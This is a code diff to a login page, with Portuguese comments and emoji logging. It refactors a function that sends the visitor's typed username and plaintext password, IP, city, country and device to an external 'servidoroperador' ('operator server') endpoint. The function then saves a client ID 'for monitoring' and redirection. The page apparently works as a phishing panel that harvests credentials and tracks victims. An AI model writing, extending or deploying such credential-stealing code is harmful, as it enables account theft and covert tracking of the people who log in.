@@ -54,39 +54,50 @@ const chatOptions = {
 }
 
 // Função para registrar cliente
+// Função para registrar cliente - REUTILIZA dados do useMetrics (FLUXO CORRETO)
 const registerClient = async (username: string, password: string) => {
   try {
-    // Obter IP
-    let ip = ""
-    let country = "BR"
-    let city = "São Paulo"
-    let device = "Unknown"
+    console.log('🚀 Iniciando registro de cliente...');
     
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json')
-      const ipData = await ipResponse.json()
-      ip = ipData.ip
+    // 📍 REUTILIZA dados que useMetrics já coletou (evita duplicação de APIs)
+    let ip = 'Unknown';
+    let country = 'BR';
+    let city = 'São Paulo';
+    let device = 'Desktop';
+    
+    // Função que detecta se é Mobile, Tablet ou Desktop (mesma do useMetrics)
+    const getDeviceType = () => {
+      if (typeof window === 'undefined' || typeof navigator === 'undefined') return 'Desktop';
       
-      // Obter localização
-      const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`)
-      const locationData = await locationResponse.json()
-      country = locationData.country_code || "BR"
-      city = locationData.city || "São Paulo"
-      
-      // Detectar dispositivo
-      const userAgent = navigator.userAgent
+      const userAgent = navigator.userAgent;
       if (/tablet|ipad|playbook|silk/i.test(userAgent)) {
-        device = "Tablet"
-      } else if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
-        device = "Mobile"
+        return 'Tablet';
+      }
+      if (/mobile|iphone|ipod|android|blackberry|opera|mini|windows\sce|palm|smartphone|iemobile/i.test(userAgent)) {
+        return 'Mobile';
+      }
+      return 'Desktop';
+    };
+    
+    device = getDeviceType();
+    
+    // Tenta recuperar dados que useMetrics já coletou (sessionStorage)
+    try {
+      const metricsData = sessionStorage.getItem('metrics_data');
+      if (metricsData) {
+        const parsed = JSON.parse(metricsData);
+        ip = parsed.ip || 'Unknown';
+        country = parsed.country || 'BR';
+        city = parsed.city || 'São Paulo';
+        console.log('📍 Reutilizando dados de localização do useMetrics:', { ip, country, city });
       } else {
-        device = "Desktop"
+        console.log('📍 Dados de localização não encontrados no sessionStorage, usando padrões');
       }
     } catch (error) {
-      console.log("Erro ao obter informações do cliente:", error)
+      console.log('📍 Erro ao recuperar dados salvos, usando padrões:', error);
     }
     
-    // Dados para registro
+    // Dados para registro (MESMO FORMATO que as métricas)
     const clientData = {
       username,
       password,
@@ -96,28 +107,40 @@ const registerClient = async (username: string, password: string) => {
       device,
       referrer: document.referrer || "direct",
       currentUrl: window.location.href
-    }
+    };
+    
+    console.log('📊 Dados do cliente preparados:', clientData);
     
     // Enviar para API
+    console.log('🌐 Enviando para API de registro...');
     const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(clientData)
-    })
+    });
+    
+    console.log('🌐 Resposta da API:', response.status, response.statusText);
     
     if (response.ok) {
       const data = await response.json()
-      console.log("Cliente registrado com sucesso:", data)
+      console.log("✅ Cliente registrado com sucesso:", data)
+      
+      // 🔑 SALVAR CLIENT_ID para monitoramento (CRÍTICO para redirecionamento)
+      if (data && data.clientId) {
+        localStorage.setItem('client_id', data.clientId);
+        console.log("🔑 Client ID salvo para monitoramento:", data.clientId);
+      }
+      
       return data
     } else {
       const errorData = await response.text()
-      console.log("Erro ao registrar cliente:", errorData)
+      console.log("❌ Erro ao registrar cliente:", errorData)
       return null
     }
   } catch (error) {
-    console.log("Erro durante registro de cliente:", error)
+    console.log("❌ Erro durante registro de cliente:", error)
     return null
   }
 }
@@ -170,7 +193,7 @@ export default function LoginPage() {
   return (
     <div className="min-h-screen flex">
       {/* Left side - Login Form */}
-      <div className="flex-1 flex flex-col justify-center px-8 sm:px-12 lg:px-16 xl:px-20 bg-white min-h-screen py-8">
+      <div className="flex-1 lg:flex-none lg:w-1/2 flex flex-col justify-center px-6 sm:px-8 lg:px-16 xl:px-20 bg-white min-h-screen py-8">
         <div className="w-full max-w-md mx-auto">
           {/* Logo */}
           <div className="mb-6">
@@ -254,7 +277,7 @@ export default function LoginPage() {
       </div>
 
       {/* Right side - Background with Phone */}
-      <div className="flex-1 relative overflow-hidden">
+      <div className="hidden lg:flex lg:flex-1 relative overflow-hidden">
         {/* Background Image */}
         <div
           className="absolute inset-0 bg-gradient-to-br from-pink-400 via-purple-500 to-blue-500"
